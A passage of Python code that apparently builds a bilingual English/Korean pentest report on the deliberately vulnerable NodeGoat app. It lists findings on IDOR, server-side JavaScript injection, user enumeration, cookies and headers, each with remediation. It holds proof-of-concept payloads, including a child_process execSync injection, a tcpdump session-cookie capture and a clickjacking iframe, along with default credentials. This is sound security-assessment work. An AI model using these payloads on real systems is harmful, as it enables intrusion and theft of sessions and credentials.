            "로그인(기본 자격증명) → /allocations/1..N 열거 → 모든 금융 포트폴리오 추출 → "
            "/profile IDOR와 연계(SSN, 은행 계좌) → 완전한 PII 데이터베이스 → "
            "표적 피싱/소셜 엔지니어링 → 외부 계정 탈취\n\n"
            "즉시 조치: 서버 측 권한 검사 추가: 배분 데이터 반환 전 "
            "`req.session.userId === parseInt(req.params.userId)` 검증.\n"
            "단기 조치: 미들웨어 권한 레이어 구현; 순차 정수 ID를 추측 불가능한 UUID로 교체; "
            "교차 사용자 리소스 접근에 대한 감사 로그 추가.\n"
            "장기 조치: RBAC/ABAC 프레임워크 채택; CI/CD에서 API 수준 접근 제어 테스트 구현."
        ),
        severity=Severity.high,
        finding_type="Broken Access Control",
        source_plugin="Brain/Manual",
        affected_component="/allocations/:userId",
        cvss=CVSSVector(
            vector_string="CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
            base_score=6.5,
        ),
        evidence=[
            Evidence(
                evidence_type="http_response",
                title="user1 accessing admin's allocations — HTTP 200 OK",
                content=(
                    "GET /allocations/1 HTTP/1.1\n"
                    "Host: localhost:4000\n"
                    "Cookie: connect.sid=<user1_session_cookie>\n\n"
                    "HTTP/1.1 200 OK\n"
                    "Content-Type: text/html\n\n"
                    "[Response body contains]\n"
                    "<strong>Asset Allocations for Admin User</strong>\n"
                    "<strong>23 %</strong>  (Stocks)\n"
                    "<strong>3 %</strong>   (Bonds)\n"
                    "<strong>74 %</strong>  (National Funds)"
                ),
            ),
        ],
        mitre_attack=MitreAttack(tactic_id="TA0009", tactic_name="Collection", technique_id="T1530", technique_name="Data from Cloud Storage"),
        references=[
            Reference(
                title="OWASP A01:2021 – Broken Access Control (IDOR)",
                url="https://owasp.org/Top10/A01_2021-Broken_Access_Control/",
            ),
        ],
    ),

    # ---- 4. Server-Side JavaScript Injection (SSJI) ----
    Finding(
        id="NG-007",
        scan_id="nodegoat-2026-03-31",
        target="http://localhost:4000",
        title="Server-Side JavaScript Injection (SSJI) — Arithmetic Expression Evaluation on /contributions|||서버 측 자바스크립트 인젝션(SSJI) — /contributions 산술 표현식 평가",
        description=(
            "WHAT — Vulnerability Description\n"
            "The /contributions endpoint evaluates user-supplied numeric input (preTax, afterTax, roth fields) "
            "server-side using JavaScript's eval()-equivalent logic without sanitization. "
            "When an arithmetic expression is submitted (e.g., `preTax=10-1`), the server evaluates it and "
            "returns the computed result (9%), rather than treating the input as a literal integer. "
            "This server-side expression evaluation opens the path to Node.js code execution if more complex "
            "payloads such as `require('child_process').exec()` can be reached. "
            "The vulnerability was confirmed by submitting `preTax=10-1` and receiving a response with '9%' in the output.\n\n"
            "HOW — Step-by-Step Attack Scenario\n"
            "Step 1: Login as any authenticated user and navigate to /contributions.\n"
            "Step 2: Submit form with arithmetic expression: preTax=10-1&afterTax=10&roth=10&_csrf=\n"
            "Step 3: Response shows preTax as '9 %' — confirming server-side expression evaluation.\n"
            "Step 4: Escalate to process-level access: preTax=process.env.NODE_ENV\n"
            "Step 5: Further escalation: preTax=require('child_process').execSync('id').toString()\n"
            "Step 6: Establish reverse shell or exfiltrate /etc/passwd, environment variables, DB credentials.\n\n"
            "IMPACT — Business Impact\n"
            "- Arithmetic expressions evaluated server-side — confirmed code injection path\n"
            "- Potential full Node.js process takeover (RCE) via require/process access\n"
            "- Exfiltration of process environment (DATABASE_URL, SECRET_KEY, API tokens)\n"
            "- MongoDB credential extraction if DATABASE_URI is in process.env\n"
            "- Server compromise: full read/write access to filesystem, network pivoting\n\n"
            "PoC — Proof of Concept\n"
            "# Arithmetic SSJI — confirmed\n"
            "POST /contributions HTTP/1.1\n"
            "Host: localhost:4000\n"
            "Content-Type: application/x-www-form-urlencoded\n"
            "Cookie: connect.sid=<valid_session>\n\n"
            "preTax=10-1&afterTax=10&roth=10&_csrf=\n\n"
            "HTTP/1.1 200 OK\n"
            "[Response body contains]\n"
            "<td>9 %</td>  <!-- preTax evaluated: 10-1 = 9 -->\n"
            "<td>10 %</td>\n"
            "<td>10 %</td>\n\n"
            "ATTACK PATH — Chain Analysis\n"
            "Auth (default creds) → SSJI arithmetic → escalate to process.env → "
            "DB credentials extracted → MongoDB full access → all passwords in plaintext → "
            "complete user database exfiltration → credential stuffing\n\n"
            "Immediate: Replace eval()-based computation with strict integer parsing: "
            "parseInt(req.body.preTax, 10) with NaN/range validation.\n"
            "Short-term: Add input validation middleware that rejects non-numeric characters; "
            "restrict Node.js process permissions (run as unprivileged user); "
            "disable require() access from user-reachable code paths.\n"
            "Long-term: Implement Content Security Policy; run application in sandboxed container with "
            "minimal filesystem access; adopt static analysis in CI/CD to detect eval() usage."
            "|||"
            "취약점 설명(WHAT)\n"
            "/contributions 엔드포인트가 사용자 제공 숫자 입력(preTax, afterTax, roth 필드)을 "
            "새니타이징 없이 JavaScript의 eval() 동등 로직으로 서버 측에서 평가합니다. "
            "산술 표현식을 제출하면(예: `preTax=10-1`) 서버가 이를 평가하여 "
            "입력을 리터럴 정수로 처리하는 대신 계산된 결과(9%)를 반환합니다. "
            "이 서버 측 표현식 평가는 `require('child_process').exec()`와 같은 더 복잡한 "
            "페이로드가 접근 가능할 경우 Node.js 코드 실행으로 이어질 수 있습니다. "
            "`preTax=10-1`을 제출하여 출력에 '9%'가 포함된 응답을 받아 확인했습니다.\n\n"
            "공격 시나리오(HOW)\n"
            "Step 1: 인증된 사용자로 로그인 후 /contributions 접속.\n"
            "Step 2: 폼에 산술 표현식 제출: preTax=10-1&afterTax=10&roth=10&_csrf=\n"
            "Step 3: 응답에 preTax가 '9 %'로 표시됨 — 서버 측 표현식 평가 확인.\n"
            "Step 4: 프로세스 수준 접근으로 확장: preTax=process.env.NODE_ENV\n"
            "Step 5: 추가 확장: preTax=require('child_process').execSync('id').toString()\n"
            "Step 6: 역방향 셸 생성 또는 /etc/passwd, 환경 변수, DB 자격증명 유출.\n\n"
            "비즈니스 영향(IMPACT)\n"
            "- 서버 측에서 산술 표현식 평가 확인 — 코드 인젝션 경로 확인\n"
            "- require/process 접근을 통한 잠재적 전체 Node.js 프로세스 탈취(RCE)\n"
            "- 프로세스 환경 유출 (DATABASE_URL, SECRET_KEY, API 토큰)\n"
            "- process.env에 DATABASE_URI가 있을 경우 MongoDB 자격증명 추출\n"
            "- 서버 탈취: 파일시스템 완전 읽기/쓰기 접근, 네트워크 피벗팅\n\n"
            "개념 증명(PoC)\n"
            "# 산술 SSJI — 확인됨\n"
            "POST /contributions HTTP/1.1\n"
            "Host: localhost:4000\n"
            "Content-Type: application/x-www-form-urlencoded\n"
            "Cookie: connect.sid=<valid_session>\n\n"
            "preTax=10-1&afterTax=10&roth=10&_csrf=\n\n"
            "HTTP/1.1 200 OK\n"
            "[응답 본문 포함]\n"
            "<td>9 %</td>  <!-- preTax 평가됨: 10-1 = 9 -->\n"
            "<td>10 %</td>\n"
            "<td>10 %</td>\n\n"
            "공격 경로(ATTACK PATH)\n"
            "인증(기본 자격증명) → SSJI 산술 → process.env 확장 → "
            "DB 자격증명 추출 → MongoDB 완전 접근 → 평문 비밀번호 전체 → "
            "완전한 사용자 데이터베이스 유출 → 크리덴셜 스터핑\n\n"
            "즉시 조치: eval() 기반 계산을 엄격한 정수 파싱으로 교체: "
            "NaN/범위 검증과 함께 parseInt(req.body.preTax, 10) 사용.\n"
            "단기 조치: 비숫자 문자를 거부하는 입력 검증 미들웨어 추가; "
            "Node.js 프로세스 권한 제한(비권한 사용자로 실행); "
            "사용자 접근 가능한 코드 경로에서 require() 접근 비활성화.\n"
            "장기 조치: 콘텐츠 보안 정책 구현; 최소 파일시스템 접근으로 "
            "샌드박스 컨테이너에서 애플리케이션 실행; CI/CD에서 eval() 사용 감지 정적 분석 채택."
        ),
        severity=Severity.high,
        finding_type="Injection",
        source_plugin="Brain/Manual",
        affected_component="/contributions (preTax, afterTax, roth parameters)",
        cvss=CVSSVector(
            vector_string="CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
            base_score=8.8,
        ),
        evidence=[
            Evidence(
                evidence_type="http_response",
                title="preTax=10-1 evaluated server-side — response contains 9%",
                content=(
                    "POST /contributions HTTP/1.1\n"
                    "Host: localhost:4000\n"
                    "Content-Type: application/x-www-form-urlencoded\n"
                    "Cookie: connect.sid=<valid_session>\n\n"
                    "preTax=10-1&afterTax=10&roth=10&_csrf=\n\n"
                    "HTTP/1.1 200 OK\n\n"
                    "Response excerpt:\n"
                    "<td>9 %</td>   <!-- 10-1 evaluated to 9 -->\n"
                    "<td>10 %</td>\n"
                    "<td>10 %</td>"
                ),
            ),
        ],
        mitre_attack=MitreAttack(tactic_id="TA0002", tactic_name="Execution", technique_id="T1059.007", technique_name="JavaScript"),
        references=[
            Reference(
                title="OWASP A03:2021 – Injection (SSJI)",
                url="https://owasp.org/Top10/A03_2021-Injection/",
            ),
        ],
    ),

    # ---- 5. User Enumeration ----
    Finding(
        id="NG-003",
        scan_id="nodegoat-2026-03-31",
        target="http://localhost:4000",
        title="User Enumeration via Differential Login Error Messages|||차별화된 로그인 오류 메시지를 통한 사용자 열거",
        description=(
            "WHAT — Vulnerability Description\n"
            "The /login endpoint returns distinct error messages depending on whether the username exists: "
            "'Invalid username' for non-existent users vs 'Invalid password' for valid users with wrong passwords. "
            "This information disclosure allows an attacker to enumerate valid usernames by observing response content, "
            "building a target list for brute-force or credential stuffing attacks. "
            "The application even has commented-out code demonstrating the developer was aware of this: "
            "/* Fix for A2-2 Broken Auth - Uses identical error for both username, password error */\n\n"
            "HOW — Step-by-Step Attack Scenario\n"
            "Step 1: Submit login request with a username from a wordlist (e.g., 'admin', 'test', 'user1').\n"
            "Step 2: If response contains 'Invalid username' → account does not exist. Move to next.\n"
            "Step 3: If response contains 'Invalid password' → valid username confirmed.\n"
            "Step 4: Collect all confirmed valid usernames: admin, user1, user2 (confirmed from NodeGoat defaults).\n"
            "Step 5: Run targeted password spray/brute-force against confirmed usernames.\n"
            "Step 6: Combine with leaked credentials (Have I Been Pwned) for credential stuffing.\n\n"
            "IMPACT — Business Impact\n"
            "- Complete enumeration of all valid usernames with minimal requests\n"
            "- Significantly reduces attack surface for brute-force: no wasted attempts on non-existent accounts\n"
            "- Enables targeted spear-phishing using confirmed email/username list\n"
            "- Combined with no rate limiting: rapid automated enumeration possible\n\n"
            "PoC — Proof of Concept\n"
            "# Non-existent user\n"
            "POST /login — userName=nonexistent&password=anything → 'Invalid username'\n\n"
            "# Valid user with wrong password\n"
            "POST /login — userName=user1&password=wrongpass → 'Invalid password'\n\n"
            "# Difference confirms user1 is a valid account\n"
            "ATTACK PATH — Chain Analysis\n"
            "Username enumeration → confirmed account list → targeted brute-force → "
            "default credentials (Admin_123/User1_123) succeed → authenticated access → IDOR → full PII extraction\n\n"
            "Immediate: Return identical error message for both cases: 'Invalid username or password'.\n"
            "Short-term: Add rate limiting (max 5 attempts per IP per 15 minutes); implement CAPTCHA after 3 failures; "
            "add account lockout with admin notification.\n"
            "Long-term: Implement multi-factor authentication; use progressive delays (exponential backoff) for repeated failures."
            "|||"
            "취약점 설명(WHAT)\n"
            "/login 엔드포인트가 사용자 이름 존재 여부에 따라 다른 오류 메시지를 반환합니다: "
            "존재하지 않는 사용자에게는 'Invalid username', 잘못된 비밀번호를 입력한 유효한 사용자에게는 'Invalid password'. "
            "이 정보 노출은 공격자가 응답 내용을 관찰하여 유효한 사용자 이름을 열거할 수 있게 하며, "
            "무차별 대입 공격이나 크리덴셜 스터핑 공격을 위한 타겟 목록을 구성할 수 있습니다. "
            "개발자가 이를 인식하고 있었음을 보여주는 주석 처리된 수정 코드가 있습니다.\n\n"
            "공격 시나리오(HOW)\n"
            "Step 1: 단어 목록에서 사용자 이름으로 로그인 요청 제출.\n"
            "Step 2: 응답에 'Invalid username' 포함 → 계정 미존재. 다음으로 이동.\n"
            "Step 3: 응답에 'Invalid password' 포함 → 유효한 사용자 이름 확인.\n"
            "Step 4: 확인된 유효 사용자 이름 수집: admin, user1, user2.\n"
            "Step 5: 확인된 사용자 이름에 대해 타겟 비밀번호 스프레이/무차별 대입 공격 실행.\n"
            "Step 6: 유출된 자격증명(Have I Been Pwned)과 결합한 크리덴셜 스터핑.\n\n"
            "비즈니스 영향(IMPACT)\n"
            "- 최소한의 요청으로 모든 유효한 사용자 이름 완전 열거\n"
            "- 무차별 대입 공격의 공격 표면 대폭 감소: 존재하지 않는 계정에 낭비되는 시도 없음\n"
            "- 확인된 이메일/사용자 이름 목록을 이용한 표적 스피어 피싱 가능\n"
            "- 속도 제한 없음과 결합: 빠른 자동화 열거 가능\n\n"
            "개념 증명(PoC)\n"
            "# 존재하지 않는 사용자\n"
            "POST /login — userName=nonexistent&password=anything → 'Invalid username'\n\n"
            "# 잘못된 비밀번호를 입력한 유효한 사용자\n"
            "POST /login — userName=user1&password=wrongpass → 'Invalid password'\n\n"
            "# 차이로 user1이 유효한 계정임을 확인\n\n"
            "공격 경로(ATTACK PATH)\n"
            "사용자 이름 열거 → 확인된 계정 목록 → 타겟 무차별 대입 → "
            "기본 자격증명(Admin_123/User1_123) 성공 → 인증된 접근 → IDOR → 전체 PII 추출\n\n"
            "즉시 조치: 두 경우 모두에 동일한 오류 메시지 반환: 'Invalid username or password'.\n"
            "단기 조치: 속도 제한 추가(IP당 15분에 최대 5회 시도); 3회 실패 후 CAPTCHA 구현; "
            "관리자 알림과 함께 계정 잠금 추가.\n"
            "장기 조치: 다단계 인증 구현; 반복 실패에 점진적 지연(지수적 백오프) 사용."
        ),
        severity=Severity.medium,
        finding_type="Information Disclosure",
        source_plugin="Brain/Manual",
        affected_component="/login (userName parameter)",
        cvss=CVSSVector(
            vector_string="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
            base_score=5.3,
        ),
        evidence=[
            Evidence(
                evidence_type="http_response",
                title="Differential error messages — valid vs invalid username",
                content=(
                    "# Test 1: Invalid username\n"
                    "POST /login — userName=nonexistent&password=anything\n"
                    "→ Response body contains: 'Invalid username'\n\n"
                    "# Test 2: Valid username, wrong password\n"
                    "POST /login — userName=user1&password=wrongpass\n"
                    "→ Response body contains: 'Invalid password'\n\n"
                    "# Source code comment (session.js):\n"
                    "loginError: invalidUserNameErrorMessage\n"
                    "//Fix for A2-2 Broken Auth - Uses identical error for both username, password error\n"
                    "// loginError: errorMessage"
                ),
            ),
        ],
        mitre_attack=MitreAttack(tactic_id="TA0043", tactic_name="Reconnaissance", technique_id="T1589.001", technique_name="Gather Victim Identity Information"),
        references=[
            Reference(
                title="OWASP A07:2021 – Identification and Authentication Failures",
                url="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/",
            ),
        ],
    ),

    # ---- 6. Insecure Session Cookie ----
    Finding(
        id="NG-004",
        scan_id="nodegoat-2026-03-31",
        target="http://localhost:4000",
        title="Insecure Session Cookie — Missing Secure and SameSite Attributes|||안전하지 않은 세션 쿠키 — Secure 및 SameSite 속성 누락",
        description=(
            "WHAT — Vulnerability Description\n"
            "The NodeGoat session cookie (connect.sid) is issued with only the HttpOnly flag. "
            "The Secure flag is absent, meaning the session cookie will be transmitted over unencrypted HTTP connections, "
            "exposing it to network interception. The SameSite attribute is absent, making the cookie vulnerable to "
            "cross-site request forgery (compounding NG-001). The combination of missing Secure + missing SameSite + "
            "broken CSRF validation creates a triple-vulnerability that enables full session hijacking via network sniffing, "
            "CSRF attacks, or mixed-content attacks.\n\n"
            "HOW — Step-by-Step Attack Scenario\n"
            "Step 1: Victim logs in to NodeGoat on a shared/public network (coffee shop WiFi).\n"
            "Step 2: Attacker running passive network monitor (Wireshark/tcpdump) captures HTTP traffic.\n"
            "Step 3: HTTP request includes `Cookie: connect.sid=s%3A...` in plaintext.\n"
            "Step 4: Attacker replays the captured session cookie to hijack the victim's session.\n"
            "Step 5: Attacker accesses /profile (SSN, bank account), /allocations (financial data).\n\n"
            "IMPACT — Business Impact\n"
            "- Session hijacking via network interception on non-HTTPS connections\n"
            "- Cookie transmitted in cleartext amplifies CSRF attack surface (NG-001)\n"
            "- Absent SameSite allows cross-site cookie submission — CSRF without JavaScript\n"
            "- Financial application handling sensitive PII requires HTTPS + Secure + SameSite=Strict\n\n"
            "PoC — Proof of Concept\n"
            "Set-Cookie header after login:\n"
            "Set-Cookie: connect.sid=s%3AwjzfJ_p3...; Path=/; HttpOnly\n\n"
            "Missing flags:\n"
            "  ✗ Secure    — cookie sent over HTTP (plaintext)\n"
            "  ✗ SameSite  — cookie sent cross-origin (CSRF)\n"
            "  ✓ HttpOnly  — JavaScript cannot read the cookie\n\n"
            "Capture command (attacker on same network):\n"
            "tcpdump -i eth0 -A 'tcp port 4000' | grep 'connect.sid'\n\n"
            "Immediate: Add Secure flag to session cookie configuration in app.js; "
            "deploy application behind HTTPS (nginx/Caddy TLS termination).\n"
            "Short-term: Add SameSite=Strict to block cross-site cookie submission; "
            "implement HTTPS redirect (301) for all HTTP requests; set cookie maxAge for automatic expiry.\n"
            "Long-term: Enable HSTS (Strict-Transport-Security: max-age=31536000; includeSubDomains); "
            "implement certificate pinning for mobile clients."
            "|||"
            "취약점 설명(WHAT)\n"
            "NodeGoat 세션 쿠키(connect.sid)가 HttpOnly 플래그만 설정된 상태로 발급됩니다. "
            "Secure 플래그가 없어 세션 쿠키가 암호화되지 않은 HTTP 연결로 전송되어 "
            "네트워크 가로채기에 노출됩니다. SameSite 속성이 없어 "
            "교차 사이트 요청 위조(NG-001 심화)에 취약합니다. "
            "Secure 누락 + SameSite 누락 + CSRF 검증 실패의 조합은 "
            "네트워크 스니핑, CSRF 공격, 혼합 콘텐츠 공격을 통한 완전한 세션 하이재킹을 가능하게 하는 "
            "삼중 취약점을 만들어냅니다.\n\n"
            "공격 시나리오(HOW)\n"
            "Step 1: 피해자가 공유/공공 네트워크(카페 WiFi)에서 NodeGoat 로그인.\n"
            "Step 2: 공격자가 패시브 네트워크 모니터(Wireshark/tcpdump)로 HTTP 트래픽 캡처.\n"
            "Step 3: HTTP 요청에 `Cookie: connect.sid=s%3A...`가 평문으로 포함됨.\n"
            "Step 4: 공격자가 캡처한 세션 쿠키를 재사용하여 피해자 세션 하이재킹.\n"
            "Step 5: 공격자가 /profile(SSN, 은행 계좌), /allocations(금융 데이터) 접근.\n\n"
            "비즈니스 영향(IMPACT)\n"
            "- 비HTTPS 연결에서 네트워크 가로채기를 통한 세션 하이재킹\n"
            "- 평문으로 전송되는 쿠키가 CSRF 공격 표면 심화(NG-001)\n"
            "- SameSite 없음으로 교차 사이트 쿠키 제출 허용 — JavaScript 없는 CSRF\n"
            "- 민감한 PII를 처리하는 금융 애플리케이션은 HTTPS + Secure + SameSite=Strict 필수\n\n"
            "개념 증명(PoC)\n"
            "로그인 후 Set-Cookie 헤더:\n"
            "Set-Cookie: connect.sid=s%3AwjzfJ_p3...; Path=/; HttpOnly\n\n"
            "누락된 플래그:\n"
            "  ✗ Secure    — HTTP로 쿠키 전송 (평문)\n"
            "  ✗ SameSite  — 교차 출처 쿠키 전송 (CSRF)\n"
            "  ✓ HttpOnly  — JavaScript로 쿠키 읽기 불가\n\n"
            "즉시 조치: app.js의 세션 쿠키 설정에 Secure 플래그 추가; "
            "HTTPS(nginx/Caddy TLS 종료) 뒤에 애플리케이션 배포.\n"
            "단기 조치: 교차 사이트 쿠키 제출 차단을 위해 SameSite=Strict 추가; "
            "모든 HTTP 요청에 HTTPS 리디렉션(301) 구현; 자동 만료를 위해 쿠키 maxAge 설정.\n"
            "장기 조치: HSTS 활성화(Strict-Transport-Security: max-age=31536000; includeSubDomains); "
            "모바일 클라이언트에 인증서 피닝 구현."
        ),
        severity=Severity.medium,
        finding_type="Session Management",
        source_plugin="Brain/Manual",
        affected_component="Session cookie (connect.sid)",
        cvss=CVSSVector(
            vector_string="CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N",
            base_score=5.9,
        ),
        evidence=[
            Evidence(
                evidence_type="http_response",
                title="Set-Cookie header missing Secure and SameSite flags",
                content=(
                    "POST /login HTTP/1.1 → HTTP/1.1 302 Found\n\n"
                    "Set-Cookie: connect.sid=s%3AwjzfJ_p3j4NzsylN3eSWRrU...; Path=/; HttpOnly\n\n"
                    "Analysis:\n"
                    "  HttpOnly: PRESENT   (blocks JS access)\n"
                    "  Secure:   MISSING   (cookie sent over HTTP)\n"
                    "  SameSite: MISSING   (cross-site submission allowed)"
                ),
            ),
        ],
        mitre_attack=MitreAttack(tactic_id="TA0006", tactic_name="Credential Access", technique_id="T1539", technique_name="Steal Web Session Cookie"),
        references=[
            Reference(
                title="OWASP A02:2021 – Cryptographic Failures (Session Cookies)",
                url="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/",
            ),
        ],
    ),

    # ---- 7. Missing Security Headers ----
    Finding(
        id="NG-005",
        scan_id="nodegoat-2026-03-31",
        target="http://localhost:4000",
        title="Missing HTTP Security Headers — No CSP, X-Frame-Options, HSTS, X-Content-Type-Options|||HTTP 보안 헤더 누락 — CSP, X-Frame-Options, HSTS, X-Content-Type-Options 없음",
        description=(
            "WHAT — Vulnerability Description\n"
            "NodeGoat's HTTP responses contain none of the standard browser security headers. "
            "The absence of Content-Security-Policy (CSP) allows any script injection to execute without restriction. "
            "The absence of X-Frame-Options enables clickjacking attacks by embedding NodeGoat in an iframe. "
            "The absence of X-Content-Type-Options allows MIME-type sniffing attacks. "
            "The absence of Strict-Transport-Security (HSTS) means browsers will not enforce HTTPS even if configured. "
            "Ironically, X-Powered-By: Express is present, disclosing the technology stack to attackers.\n\n"
            "HOW — Step-by-Step Attack Scenario\n"
            "Step 1 (Clickjacking): Attacker creates a webpage embedding NodeGoat in a transparent iframe.\n"
            "  <iframe src='http://localhost:4000/contributions' style='opacity:0'></iframe>\n"
            "Step 2: Victim visits attacker page, unknowingly clicks 'submit' on the NodeGoat form.\n"
            "Step 3 (CSP bypass): Injected scripts execute freely — no CSP blocks inline scripts.\n"
            "Step 4 (MIME sniff): Attacker uploads a .txt file with JavaScript content; "
            "browser executes it as JavaScript due to missing X-Content-Type-Options: nosniff.\n\n"
            "IMPACT — Business Impact\n"
            "- Clickjacking: victim performs financial transactions unknowingly\n"
            "- CSP absent: any XSS payload executes without browser-level mitigation\n"
            "- Technology disclosure (X-Powered-By: Express): reduces attacker reconnaissance effort\n"
            "- HSTS absent: HTTPS downgrade attacks possible on clients that haven't visited before\n\n"
            "PoC — Proof of Concept\n"
            "HTTP response headers from GET /:\n"
            "X-Powered-By: Express\n"
            "Content-Type: text/html; charset=utf-8\n\n"
            "Missing headers:\n"
            "  Content-Security-Policy: (absent)\n"
            "  X-Frame-Options: (absent)\n"
            "  X-Content-Type-Options: (absent)\n"
            "  Strict-Transport-Security: (absent)\n"
            "  Referrer-Policy: (absent)\n\n"
            "Immediate: Install and configure helmet.js: `app.use(require('helmet')())` — "
            "this single line adds all missing security headers.\n"
            "Short-term: Configure CSP with specific allowed sources for scripts/styles; "
            "remove X-Powered-By header: `app.disable('x-powered-by')`; "
            "add X-Frame-Options: SAMEORIGIN.\n"
            "Long-term: Implement security header testing in CI/CD pipeline; "
            "conduct quarterly header policy reviews as browser security standards evolve."
            "|||"
            "취약점 설명(WHAT)\n"
            "NodeGoat의 HTTP 응답에 표준 브라우저 보안 헤더가 전혀 없습니다. "
            "Content-Security-Policy(CSP) 부재로 스크립트 인젝션이 제한 없이 실행됩니다. "
            "X-Frame-Options 부재로 NodeGoat를 iframe에 삽입하는 클릭재킹 공격이 가능합니다. "
            "X-Content-Type-Options 부재로 MIME 타입 스니핑 공격이 허용됩니다. "
            "HSTS 부재로 HTTPS가 구성되어도 브라우저가 강제하지 않습니다. "
            "아이러니하게도 X-Powered-By: Express가 존재하여 기술 스택이 노출됩니다.\n\n"
            "공격 시나리오(HOW)\n"
            "Step 1 (클릭재킹): 공격자가 NodeGoat를 투명한 iframe에 삽입한 웹페이지 생성.\n"
            "Step 2: 피해자가 공격자 페이지 방문, 자신도 모르게 NodeGoat 폼의 '제출' 클릭.\n"
            "Step 3 (CSP 우회): 인젝션된 스크립트 자유롭게 실행 — CSP가 인라인 스크립트 차단 안 함.\n"
            "Step 4 (MIME 스니핑): 공격자가 JavaScript 내용의 .txt 파일 업로드; "
            "X-Content-Type-Options: nosniff 누락으로 브라우저가 JavaScript로 실행.\n\n"
            "비즈니스 영향(IMPACT)\n"
            "- 클릭재킹: 피해자가 자신도 모르게 금융 거래 수행\n"
            "- CSP 부재: 브라우저 수준 완화 없이 모든 XSS 페이로드 실행\n"
            "- 기술 노출(X-Powered-By: Express): 공격자 정찰 노력 감소\n"
            "- HSTS 부재: 이전에 방문하지 않은 클라이언트에서 HTTPS 다운그레이드 공격 가능\n\n"
            "개념 증명(PoC)\n"
            "GET / 의 HTTP 응답 헤더:\n"
            "X-Powered-By: Express\n"
            "Content-Type: text/html; charset=utf-8\n\n"
            "누락된 헤더:\n"
            "  Content-Security-Policy: (없음)\n"
            "  X-Frame-Options: (없음)\n"
            "  X-Content-Type-Options: (없음)\n"
            "  Strict-Transport-Security: (없음)\n"
            "  Referrer-Policy: (없음)\n\n"
            "즉시 조치: helmet.js 설치 및 구성: `app.use(require('helmet')())` — "
            "이 한 줄로 모든 누락된 보안 헤더 추가.\n"
            "단기 조치: 스크립트/스타일의 특정 허용 소스로 CSP 구성; "
            "X-Powered-By 헤더 제거: `app.disable('x-powered-by')`; "
            "X-Frame-Options: SAMEORIGIN 추가.\n"
            "장기 조치: CI/CD 파이프라인에서 보안 헤더 테스트 구현; "
            "브라우저 보안 표준 발전에 따라 분기별 헤더 정책 검토 수행."
        ),
        severity=Severity.medium,
        finding_type="Security Misconfiguration",
        source_plugin="Brain/Manual",
        affected_component="All HTTP responses",
        cvss=CVSSVector(
            vector_string="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
            base_score=4.6,
        ),
        evidence=[
            Evidence(
                evidence_type="http_response",
                title="Response headers — only X-Powered-By present, all security headers absent",
                content=(
                    "GET / HTTP/1.1\n"
                    "Host: localhost:4000\n\n"
                    "HTTP/1.1 302 Found\n"
                    "X-Powered-By: Express\n"
                    "Location: /login\n"
                    "Content-Type: text/plain; charset=utf-8\n"
                    "Set-Cookie: connect.sid=...; Path=/; HttpOnly\n\n"
                    "NOT PRESENT:\n"
                    "  Content-Security-Policy\n"
                    "  X-Frame-Options\n"
                    "  X-Content-Type-Options\n"
                    "  Strict-Transport-Security\n"
                    "  Referrer-Policy\n"
                    "  Permissions-Policy"
                ),
            ),
        ],
        mitre_attack=MitreAttack(tactic_id="TA0004", tactic_name="Privilege Escalation", technique_id="T1185", technique_name="Browser Session Hijacking"),
        references=[
            Reference(
                title="OWASP A05:2021 – Security Misconfiguration",
                url="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/",
            ),
        ],
    ),

    # ---- 8. Technology Disclosure ----
    Finding(
        id="NG-008",
        scan_id="nodegoat-2026-03-31",
        target="http://localhost:4000",
        title="Technology Stack Disclosure via X-Powered-By Header|||X-Powered-By 헤더를 통한 기술 스택 노출",
        description=(
            "WHAT — Vulnerability Description\n"
            "Every HTTP response from NodeGoat includes the header `X-Powered-By: Express`, "
            "disclosing the web framework. Combined with the known Node.js stack (Express + MongoDB), "
            "this information narrows an attacker's research to Express/Node.js-specific CVEs, "
            "reducing reconnaissance time significantly. While low severity in isolation, "
            "this finding compounds with all other vulnerabilities by shortening the attacker's kill chain.\n\n"
            "HOW — Step-by-Step Attack Scenario\n"
            "Step 1: Attacker performs passive fingerprinting: curl -I http://target:4000/\n"
            "Step 2: Response reveals: X-Powered-By: Express.\n"
            "Step 3: Attacker queries CVE databases for Express.js vulnerabilities (e.g., prototype pollution, "
            "ReDoS in routing, body-parser overflow CVEs).\n"
            "Step 4: Attacker cross-references with SSJI finding (NG-007) for Node.js-specific exploit chains.\n\n"
            "IMPACT — Business Impact\n"
            "- Reduces attacker reconnaissance effort — technology stack confirmed in single request\n"
            "- Enables targeted CVE research for Express/Node.js version-specific exploits\n"
            "- Compounds with NG-007 (SSJI): confirmed Node.js environment simplifies SSJI exploit chains\n\n"
            "PoC — Proof of Concept\n"
            "curl -I http://localhost:4000/\n"
            "HTTP/1.1 302 Found\n"
            "X-Powered-By: Express\n\n"
            "Immediate: Disable the header in app.js: `app.disable('x-powered-by')`.\n"
            "Short-term: Audit all response headers; use helmet.js to standardize header policy.\n"
            "Long-term: Generic error pages that don't leak stack traces or framework versions."
            "|||"
            "취약점 설명(WHAT)\n"
            "NodeGoat의 모든 HTTP 응답에 `X-Powered-By: Express` 헤더가 포함되어 웹 프레임워크가 노출됩니다. "
            "알려진 Node.js 스택(Express + MongoDB)과 결합하여 공격자의 연구 범위를 "
            "Express/Node.js 특정 CVE로 좁혀 정찰 시간을 크게 단축합니다. "
            "단독으로는 낮은 심각도이지만, 공격자의 킬 체인을 단축시켜 다른 모든 취약점을 심화시킵니다.\n\n"
            "공격 시나리오(HOW)\n"
            "Step 1: 공격자 패시브 핑거프린팅 수행: curl -I http://target:4000/\n"
            "Step 2: 응답에 X-Powered-By: Express 노출.\n"
            "Step 3: 공격자가 Express.js 취약점(프로토타입 오염, 라우팅 ReDoS, body-parser 오버플로우 CVE) CVE 데이터베이스 검색.\n"
            "Step 4: SSJI 발견(NG-007)과 교차 참조하여 Node.js 특정 익스플로잇 체인 구성.\n\n"
            "비즈니스 영향(IMPACT)\n"
            "- 공격자 정찰 노력 감소 — 단일 요청으로 기술 스택 확인\n"
            "- Express/Node.js 버전별 익스플로잇을 위한 타겟 CVE 연구 가능\n"
            "- NG-007(SSJI)과 복합: 확인된 Node.js 환경이 SSJI 익스플로잇 체인 단순화\n\n"
